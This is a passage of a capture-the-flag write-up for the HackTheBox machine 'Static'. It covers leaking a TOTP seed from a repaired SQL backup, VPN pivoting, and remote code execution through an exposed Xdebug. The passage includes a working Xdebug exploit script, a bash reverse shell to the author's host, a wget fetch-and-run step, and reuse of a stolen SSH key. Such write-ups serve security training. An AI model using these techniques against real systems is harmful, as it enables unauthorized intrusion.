---
maquina: "Static"
dificultad: "Hard"
os: "Linux"
plataforma: "htb"
release: "19 Jun 2021"
retire: "18 Dec 2021"
creadores: "ompamo"
htb_url: "https://hackthebox.com/machines/static"
app_url: "https://app.hackthebox.com/machines/355"
url: "https://0xdf.gitlab.io/2021/12/18/htb-static.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Static was a really great hard box. I’ll start by finding a corrupted gzipped SQL backup, which I can use to leak the seed for a TOTP 2FA, allowing me access to an internal page. There I’ll get a VPN config, which I’ll use to connect to the network and get access to additional hosts. There’s a web host that has xdebug running on it’s PHP page, allowing for code execution. From there, I’ll pivot to a PKI host that I can only reach from web. I’ll exploit a PHP-FPM bug to get a shell on there. On this box, there’s a binary with setuid capabilities and a format string exploit, which I’ll use to leak addresses and then overwrite the path to a binary called to have it run my reverse shell. In Beyond Root, I’ll look at an unintended Path Hijack in an actual open-source program, easy-rsa.

## Recon

### nmap

`nmap` found three open TCP ports, two SSH (22 and 2222) and HTTP (8080):

```console
oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.246
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 14:41 EDT
Nmap scan report for 10.10.10.246
Host is up (0.040s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 44.74 seconds

oxdf@parrot$ nmap -p 22,2222,8080 -sCV -oA scans/nmap-tcpscripts 10.10.10.246
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 14:44 EDT
Nmap scan report for 10.10.10.246
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version on port 22 and the [Apache](https://packages.debian.org/search?keywords=apache2) version, the host is likely running Debian 10 Buster. The SSH on 2222 looks to [match](https://packages.ubuntu.com/search?keywords=openssh-server) Ubuntu 18.04 Bionic. Anytime there are two SSH listeners, especially of different OS versions, my first thought is Docker containers.

`nmap` also found `robots.txt` with two entries. I’ll be sure to check that out.

### Website - TCP 8080

#### Site

The main site just returns an empty page. Looking at the response in Burp, it is a 200 response, but there’s no body:

```http
HTTP/1.1 200 OK
Date: Tue, 27 Jul 2021 20:41:27 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

To check out what kind of site it is, I tried `index.php`, and it returned the same blank 200. That’s a good sign that PHP is being used.

There is a `robots.txt` file, as `nmap` identified:

```console
oxdf@parrot$ curl http://10.10.10.246:8080/robots.txt
User-agent: *
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

#### Directory Brute Force

Before looking at those, I’ll start `feroxbuter` in the background to look for additional paths. I’ll include `-x php` since I know the site is PHP:

```console
oxdf@parrot$ feroxbuster -u http://10.10.10.246:8080 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.246:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        0l        0w        0c http://10.10.10.246:8080/index.php
403        9l       28w      279c http://10.10.10.246:8080/server-status
[####################] - 33s    59998/59998   0s      found:2       errors:0
[####################] - 32s    59998/59998   1849/s  http://10.10.10.246:8080
```

Nothing.

#### /vpn/

Interestingly, going to `/vpn` returns a 404 not found, but `/vpn/` returns a 302 redirect to `/vpn/login.php`, which presents a very plain login form:

![image-20210727173614893](https://0xdfimages.gitlab.io/img/image-20210727173614893.png)

When I try creds that shouldn’t work, it tells me:

![image-20210727173639126](https://0xdfimages.gitlab.io/img/image-20210727173639126.png)

When I tried admin / admin, it worked, but I need 2FA:

![image-20210727173704965](https://0xdfimages.gitlab.io/img/image-20210727173704965.png)

Entering a code just redirects back to the username and password form. I could try to brute force this if I get stuck elsewhere.

#### /.ftp_uploads

`/.ftp_uploads` (with or without the trailing slash) leads to a directory with listing enabled:

![image-20210727173945221](https://0xdfimages.gitlab.io/img/image-20210727173945221.png)

`warning.txt` is just that, a warning:

```plaintext
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

The other file looks like a database backup based on the name, and `file` confirms:

```console
oxdf@parrot$ file db.sql.gz
db.sql.gz: gzip compressed data, was "db.sql", last modified: Thu Jun 18 15:43:42 2020, from Unix, original size modulo 2^32 355
```

Unfortunately, it seems it’s corrupt:

```console
oxdf@parrot$ gunzip db.sql.gz

gzip: db.sql.gz: invalid compressed data--crc error

gzip: db.sql.gz: invalid compressed data--length error
```

## Shell as www-data on web

### Recover DB

#### gzip / zcat

As I noted above, running `gunzip` bails out because it CRC errors. [This Stackoverflow post](https://stackoverflow.com/questions/13149751/force-gzip-to-decompress-despite-crc-error) talks about how `gzip` itself (which is called by `gunzip`) will decompress all the valid data it can before checking the CRC, which means it can be called to get as much data as possible:

```console
oxdf@parrot$ gzip -dc < db.sql.gz > db.sql

gzip: stdin: invalid compressed data--crc error

gzip: stdin: invalid compressed data--length error
```

It still prints errors, but there’s also a `db.sql` file now:

```console
oxdf@parrot$ file db.sql
db.sql: ASCII text
oxdf@parrot$ cat db.sql
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA;
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
IN
```

This also works the same way with `zcat`:

```console
oxdf@parrot$ zcat db.sql.gz
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA;
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
IN

gzip: db.sql.gz: invalid compressed data--crc error

gzip: db.sql.gz: invalid compressed data--length error
```

It’s clearly not perfect, but it’s possible that I have a hash there? I know the password is “admin”, so I can find the SHA1 of it and compare:

```console
oxdf@parrot$ echo "d05nade22ae348aeb5660fc2140aec35850c4da997"; echo -n "admin" | sha1sum
d05nade22ae348aeb5660fc2140aec35850c4da997
d033e22ae348aeb5660fc2140aec35850c4da997  -
```

So it’s close, but not something really usable.

#### fixgz

[This Stackoverflow post](https://stackoverflow.com/questions/33052406/invalid-compressed-data-format-violated) talks about Gzip’s `fixgz` utility, which used to be on the gzip.org website, but apparently is no longer. Fortunately, someone has hosted the source on [GitHub](https://github.com/yonjar/fixgz).

I’ll clone the repo and compile it:

```console
oxdf@parrot$ git clone https://github.com/yonjar/fixgz.git
Cloning into 'fixgz'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), 9.19 KiB | 9.19 MiB/s, done.
Resolving deltas: 100% (1/1), done.
oxdf@parrot$ cd fixgz/
oxdf@parrot$ gcc fixgz.cpp -o fixgz
oxdf@parrot$ ./fixgz
usage: fixgz bad.gz fixed.gz
```

Now I’ll give it a run on the file. The output is still gzipped data:

```console
oxdf@parrot$ /opt/fixgz/fixgz db.sql.gz db.sql-fixed.gz
oxdf@parrot$ file db.sql-fixed.gz
db.sql-fixed.gz: gzip compressed data, was "db.sql", last modified: Thu Jun 18 15:43:42 2020, from Unix, original size modulo 2^32 355
```

The file is much cleaner now:

```console
oxdf@parrot$ zcat db.sql-fixed.gz
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) );
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

The hash without `fixgz` wasn’t complete, but the time-based one time password (TOTP) field was.

`d033e22ae348aeb5660fc2140aec35850c4da997` is the [SHA1 hash](https://sha1.gromweb.com/?hash=d033e22ae348aeb5660fc2140aec35850c4da997) for the string “admin”. That makes sense with the already guessed login. The `totp` field is definitely interesting.

### Login To Page

#### Initial Failures

I have a TOTP seed. In [Jewel](https://0xdf.gitlab.io/2021/02/13/htb-jewel.html#2fa), I used a tool called [oathtool](https://www.nongnu.org/oath-toolkit/man-oathtool.html) (`apt install oathtool`). I tried that here to generate a token:

```console
oxdf@parrot$ oathtool -b --totp 'orxxi4c7orxwwzlo'
513362
```

I’ll log in with admin / admin, and then enter the token, but it just routes back to the login form. I did some playing around with other tools to make sure it wasn’t a tool issue. Python has a `pyotp` module. I’ll import the module and create an object with the seed:

```console
oxdf@parrot$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pyotp
>>> totp = pyotp.TOTP('orxxi4c7orxwwzlo')
```

Looking at the functions available, there’s a `now` function:

```console
>>> dir(totp)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'at', 'byte_secret', 'digest', 'digits', 'generate_otp', 'int_to_bytestring', 'interval', 'now', 'provisioning_uri', 'secret', 'timecode', 'verify']
```

It generates a similar token:

```console
>>> totp.now()
'561157'
```

That token matches what `oathtool` generates at the same time. There is also the `at` function, which will allow me to get the token at a given time.

#### NTP

For this kind of time-based token to work, the target computer and my computer need to have the same time. So if there’s a skew between the two clocks, the token won’t work.

`nmap` is kind of vague as to if NTP is open:

```console
oxdf@parrot$ nmap -sU -p 123 10.10.10.246
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 16:16 EDT
Nmap scan report for 10.10.10.246
Host is up (0.018s latency).

PORT    STATE         SERVICE
123/udp open|filtered ntp

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```

But with version detection, it shows a version, which is a really good sign it’s open:

```console
oxdf@parrot$ nmap -sU -p 123 -sV 10.10.10.246
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 16:17 EDT
Nmap scan report for 10.10.10.246
Host is up (0.018s latency).

PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (unsynchronized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

If I add in default scripts, it actually returns the skew:

```console
oxdf@parrot$ nmap -sU -p 123 -sCV 10.10.10.246
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 16:17 EDT
Nmap scan report for 10.10.10.246
Host is up (0.020s latency).

PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (unsynchronized)
| ntp-info:
|_

Host script results:
|_clock-skew: 3m19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.96 seconds
```

I could have also found this with `ntpdate`:

```console
oxdf@parrot$ ntpdate -q 10.10.10.246
server 10.10.10.246, stratum 16, offset +195.503495, delay 0.05276
 2 Aug 16:19:12 ntpdate[4037]: no server suitable for synchronization found
```

The “offset” of 195 seconds is pretty close to the result from `nmap`.

Or, of course, I could [do it in Python](https://stackoverflow.com/questions/12664295/ntp-client-in-python/33436061), which will come in handy in the next section:

```console
>>> import ntplib
>>> from time import ctime
>>> c = ntplib.NTPClient()
>>> resp = c.request('10.10.10.246')
>>> print(ctime(resp.tx_time))
Mon Aug  2 16:24:01 2021
```

One other thing about using VirtualBox - I had to stop the service on my host, or it would fix the time inside the guest VM:

```bash
sudo service virtualbox-guest-utils stop
```

#### Generate TOTP Token

With the time on Static, I can write a Python script that will get the time, and then generate the token.

```python
#!/usr/bin/env python3

import ntplib
import pyotp
from time import ctime


c = ntplib.NTPClient()
resp = c.request("10.10.10.246")
print(f"Current time on Static: {ctime(resp.tx_time)}")

totp = pyotp.TOTP("orxxi4c7orxwwzlo")
print(f"Token: {totp.at(resp.tx_time)}")
```

Running this generates a token:

```console
oxdf@parrot$ python3 gen_totp.py
Current time on Static: Mon Aug  2 16:27:20 2021
Token: 899415
```

And entering it into the login page works!

### Access Internal Network

#### Enumerate Site

The site looks like an internal IT site:

![image-20210802162443360](https://0xdfimages.gitlab.io/img/image-20210802162443360.png)

It has a status for various servers with IP addresses. I thought I might find some API calls or something for the status, but the source shows it is static (could still be dynamically generated at the server).

On entering something into the Common Name field, and clicking the generate button, I’m downloading a `.ovpn` config:

![image-20210802164430340](https://0xdfimages.gitlab.io/img/image-20210802164430340.png)

The top of this file gives the remote server, port, and protocol:

```plaintext
dev tun9
proto udp
remote vpn.static.htb 1194
```

`dev tun9` specifies the device that will attempt to be added on connection.

#### Connect

I’ll need to add `vpn.static.htb` to `/etc/hosts` so that it resolves, but then it’s as simple as running `openvpn`:

```console
oxdf@parrot$ sudo openvpn 0xdf.ovpn
2021-08-02 16:47:15 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-08-02 16:47:15 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-08-02 16:47:15 library versions: OpenSSL 1.1.1k  25 Mar 2021, LZO 2.10
2021-08-02 16:47:15 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-08-02 16:47:15 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-08-02 16:47:15 TCP/UDP: Preserving recently used remote address: [AF_INET]10.10.10.246:1194
2021-08-02 16:47:15 Socket Buffers: R=[212992->212992] S=[212992->212992]
2021-08-02 16:47:15 UDP link local: (not bound)
2021-08-02 16:47:15 UDP link remote: [AF_INET]10.10.10.246:1194
2021-08-02 16:47:15 NOTE: UID/GID downgrade will be delayed because of --client, --pull, or --up-delay
2021-08-02 16:47:15 TLS: Initial packet from [AF_INET]10.10.10.246:1194, sid=c0757a85 d64082e0
2021-08-02 16:47:15 VERIFY OK: depth=1, CN=static-gw
2021-08-02 16:47:15 VERIFY KU OK
2021-08-02 16:47:15 Validating certificate extended key usage
2021-08-02 16:47:15 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2021-08-02 16:47:15 VERIFY EKU OK
2021-08-02 16:47:15 VERIFY OK: depth=0, CN=static-gw
2021-08-02 16:47:15 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, 2048 bit RSA
2021-08-02 16:47:15 [static-gw] Peer Connection Initiated with [AF_INET]10.10.10.246:1194
2021-08-02 16:47:16 SENT CONTROL [static-gw]: 'PUSH_REQUEST' (status=1)
2021-08-02 16:47:16 PUSH: Received control message: 'PUSH_REPLY,route 172.17.0.0 255.255.255.0,route-gateway 172.30.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 172.30.0.9 255.255.0.0,peer-id 1,cipher AES-256-GCM'
2021-08-02 16:47:16 OPTIONS IMPORT: timers and/or timeouts modified
2021-08-02 16:47:16 OPTIONS IMPORT: --ifconfig/up options modified
2021-08-02 16:47:16 OPTIONS IMPORT: route options modified
2021-08-02 16:47:16 OPTIONS IMPORT: route-related options modified
2021-08-02 16:47:16 OPTIONS IMPORT: peer-id set
2021-08-02 16:47:16 OPTIONS IMPORT: adjusting link_mtu to 1624
2021-08-02 16:47:16 OPTIONS IMPORT: data channel crypto options modified
2021-08-02 16:47:16 Data Channel: using negotiated cipher 'AES-256-GCM'
2021-08-02 16:47:16 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2021-08-02 16:47:16 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2021-08-02 16:47:16 net_route_v4_best_gw query: dst 0.0.0.0
2021-08-02 16:47:16 net_route_v4_best_gw result: via 10.1.1.1 dev eth0
2021-08-02 16:47:16 ROUTE_GATEWAY 10.1.1.1/255.255.255.0 IFACE=eth0 HWADDR=08:00:27:6d:87:cb
2021-08-02 16:47:16 TUN/TAP device tun9 opened
2021-08-02 16:47:16 net_iface_mtu_set: mtu 1500 for tun9
2021-08-02 16:47:16 net_iface_up: set tun9 up
2021-08-02 16:47:16 net_addr_v4_add: 172.30.0.9/16 dev tun9
2021-08-02 16:47:16 net_route_v4_add: 172.17.0.0/24 via 172.30.0.1 dev [NULL] table 0 metric -1
2021-08-02 16:47:16 GID set to nogroup
2021-08-02 16:47:16 UID set to nobody
2021-08-02 16:47:16 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2021-08-02 16:47:16 Initialization Sequence Completed
```

In another pane, `ifconfig` shows that my local VM has a tun9 adapter with an IP on 172.30.0.0/16:

```plaintext
tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
        inet6 fe80::16a6:3fd6:eb92:7bfd  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 192 (192.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

#### Add Route

I’m able to ping vpn (172.30.0.1), which makes sense as it’s on the same network as my VM. I’m not able to ping web (172.20.0.10), db (172.20.0.11), or pki (192.168.254.3).

Running `route` on my host shows there’s no route to these networks:

```console
oxdf@parrot$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.1.1.1        0.0.0.0         UG    100    0        0 eth0
10.1.1.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
10.1.1.1        0.0.0.0         255.255.255.255 UH    100    0        0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG    50     0        0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U     50     0        0 tun0
172.17.0.0      172.30.0.1      255.255.255.0   UG    0      0        0 tun9
172.30.0.0      0.0.0.0         255.255.0.0     U     0      0        0 tun9
```

That means that when I try to connect to them, the packets are going out the default gateway, which is my home network gateway, and then onto the internet, where they are not routable because these are [RFC-1918](https://en.wikipedia.org/wiki/Private_network) IPs.

I’ll add the route through the VPN gateway:

```console
oxdf@parrot$ sudo route add -net 172.20.0.0/16 gw 172.30.0.1
[sudo] password for oxdf:
oxdf@parrot$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.1.1.1        0.0.0.0         UG    100    0        0 eth0
10.1.1.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
10.1.1.1        0.0.0.0         255.255.255.255 UH    100    0        0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG    50     0        0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U     50     0        0 tun0
172.17.0.0      172.30.0.1      255.255.255.0   UG    0      0        0 tun9
172.20.0.0      172.30.0.1      255.255.0.0     UG    0      0        0 tun9
172.30.0.0      0.0.0.0         255.255.0.0     U     0      0        0 tun9
```

Now I can `ping` both web and db:

```console
oxdf@parrot$ ping -c 1 172.20.0.10
PING 172.20.0.10 (172.20.0.10) 56(84) bytes of data.
64 bytes from 172.20.0.10: icmp_seq=1 ttl=63 time=19.7 ms

--- 172.20.0.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 19.681/19.681/19.681/0.000 ms
oxdf@parrot$ ping -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11) 56(84) bytes of data.
64 bytes from 172.20.0.11: icmp_seq=1 ttl=63 time=19.1 ms

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 19.115/19.115/19.115/0.000 ms
```

I tried to add a route for the class-C network with PKI (192.168.254.0/24), but I still can’t ping it. I’ll note that one for later.

### Shell

#### Enumeration

Visiting 172.20.0.10 in Firefox shows a directory with no index and directory listing on:

![image-20210802170130377](https://0xdfimages.gitlab.io/img/image-20210802170130377.png)

`vpn/` is the same login form I found before. `info.php` leads to a PHP info page:

![image-20210802170350528](https://0xdfimages.gitlab.io/img/image-20210802170350528.png)

Click for full image

There’s a ton of info there, but one bit that jumps out as unusual, xdebug:

[![image-20210802170440009](https://0xdfimages.gitlab.io/img/image-20210802170440009.png)
*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210802170440009.png)

#### Getting Connection

[Xdebug](https://xdebug.org/) is a PHP extension designed to give developers feedback on their application. It is not meant to run in production. I actually played with this years ago on [HTB Olympus](https://0xdf.gitlab.io/2018/09/22/htb-olympus.html#rce-through-xdebug). Most configurations limit connection for Xdebug to localhost, but an insecure configuration will allow for it to connect to any IP. In fact, I can look at the PHP info and see that remote debugging is enabled:

![image-20210802201427728](https://0xdfimages.gitlab.io/img/image-20210802201427728.png)

I can send a request to the server with the argument `XDEBUG_SESSION_START=[some name]` (or with that as a cookie), then the site will connect back to the IP connecting to it on TCP 9000. I can also use the `X-Forwarded-For` header to tell it to connect back to another host as well.

For example, I’ll start `nc` on tcp 9000, and run `curl 172.20.0.10/info.php?XDEBUG_SESSION_START=0xdf` to trigger the debugger. There’s a connection at `nc`:

```console
oxdf@parrot$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [172.30.0.9] from (UNKNOWN) [172.30.0.1] 50964
489<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/info.php" language="PHP" xdebug:language_version="7.2.1-1ubuntu2" protocol_version="1.0" appid="50" idekey="0xdf"><engine version="2.6.0"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2018 by Derick Rethans]]></copyright></init>
```

There’s an Xdebug client that can be downloaded from [the Xdebug site](https://xdebug.org/docs/dbgpClient), but it isn’t great. I’ll run it, using `-p 9000` to listen on port 9000:

```console
oxdf@parrot$ ./dbgpClient -p 9000
Xdebug Simple DBGp client (0.4.2)
Copyright 2019-2020 by Derick Rethans
In dumb client mode

Waiting for debug server to connect on port 9000.
```

Now I’ll trigger the curl, and there’s a connection:

```plaintext
Waiting for debug server to connect on port 9000.
Connect from 172.30.0.1:51018
DBGp/1.0: Xdebug 2.6.0 — For PHP 7.2.1-1ubuntu2
Debugging file:///var/www/html/info.php (ID: 43/0xdf)
(cmd)
```

The command syntax is weird. There’s an `eval` command, and the syntax is `eval -i [id] -- {base64 encoded command}`. So if I wanted to run `id`, first I need to encode the PHP:

```console
oxdf@parrot$ echo 'system("id");' | base64
c3lzdGVtKCJpZCIpOwo=
```

And now send it:

```console
(cmd) eval -i 1 -- c3lzdGVtKCJpZCIpOwo=;
1 | eval
1 | string : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Still, as clunky as that is, it’s RCE.

#### Script

I’ll write a short Python script that will handle this connection, get a command, decode the response, and print it:

```python
#!/usr/bin/env python

import base64
import re
import socket


res_re = re.compile(r'\<\!\[CDATA\[([A-Za-z0-9+/]+={0,2})\]\]\>')
ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()
client_data = conn.recv(1024)

while  True:
    cmd = input ('>> ')
    cmdstr = f'shell_exec("{cmd}");'.encode('ascii')
    conn.sendall(b'eval -i 1 -- ' + base64.b64encode(cmdstr) + b'\x00')
    resp = conn.recv(1024)
    try:
        encoded_res = res_re.search(resp.decode()).group(1)
        print(base64.b64decode(encoded_res.encode()).decode().strip())
    except AttributeError:
        pass
```

I started with some scripts I found on GitHub (like [this](https://github.com/nqxcode/xdebug-exploit)), but added in the decode of the response.

It works nicely:

```console
oxdf@parrot$ python xdebug.py
>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
>> pwd
/var/www/html
>> ls
info.php
vpn
```

#### Shell

Really, I just need to create a reverse shell, so in theory, writing that Python script is unnecessary. Still, getting a reverse shell was a bit tricky. My go-to reverse shell with Bash didn’t seem to work over the Xdebug run, and `nc` isn’t on the box. Eventually, I found that `wget` was:

```console
>> which wget
/usr/bin/wget
```

I’ll write a simple reverse shell script, `rev.sh`:

```bash
#!/bin/bash

bash -i >& /dev/tcp/172.30.0.9/443 0>&1
```

With a Python webserver started, I’ll get the shell, and then run it:

```console
>> wget 172.30.0.9/rev.sh -O /tmp/.0xdf
>> bash /tmp/.0xdf
```

There’s a hit at the webserver:

```plaintext
172.30.0.1 - - [02/Aug/2021 20:51:35] "GET /rev.sh HTTP/1.1" 200 -
```

And then a reverse shell at `nc`:

```console
oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [172.30.0.9] from (UNKNOWN) [172.30.0.1] 47032
bash: cannot set terminal process group (39): Inappropriate ioctl for device
bash: no job control in this shell
www-data@web:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I’ll upgrade my shell:

```console
www-data@web:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@web:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@web:/var/www/html$
```

The user flag is in `/home`:

```console
www-data@web:/home$ ls
user.txt  www-data
www-data@web:/home$ cat user.txt
cc0563a9************************
```

## Shell as www-data on pki

### Enumeration

#### web

There’s not a ton on web. It feels like a Docker container. There’s a `/entry.sh` file that starts SSH and Apache:

```bash
#!/bin/bash
service ssh restart
service apache2 restart && tail -f /var/log/apache2/error.log
```

`ifconfig` shows two NICs, where eth0 has 172.20.0.10 and eth1 has 192.168.254.2 (same subnet as the pki host from the status page).

There is a www-data user in `/home` (which is a bit odd), and a RSA key pair in `/home/www-data/.ssh`, and the public key is in the `authorized_keys` file, so I can grab the private key and get an ssh shell:

```console
oxdf@parrot$ ssh -i ~/keys/static-www-data-172.20.0.10 www-data@172.20.0.10
...[snip]...
www-data@web:~$
```

This will prove super useful for pivoting around this little network.

The web directory contains `info.php` and `vpn/`, just like the listing showed:

```console
www-data@web:/var/www/html$ ls
info.php  vpn
```

There must be some rule on the main host that is sending back blank responses for `/` and not forwarding them to the container.

The `vpn` directory has a handful of PHP files:

```console
www-data@web:/var/www/html/vpn$ ls
actions.php  database.php  header.php  index.php  login.php  panel.php  src
```

`panel.php` first checks that the user is authed:

```php
if($_SESSION['auth']!="GRANTED"){
        session_destroy();
        header("Location: index.php");
```

Then it checks for the POST request that’s generated when asking for a VPN key:

```php
} else {
        if(isset($_POST['cn'])){
                $cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_POST['cn']);
                header('Content-type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.$cn.'.ovpn"');
                $handle = curl_init();
                $url = "http://pki/?cn=".$cn;
                curl_setopt($handle, CURLOPT_URL, $url);
                curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
                $output = curl_exec($handle);
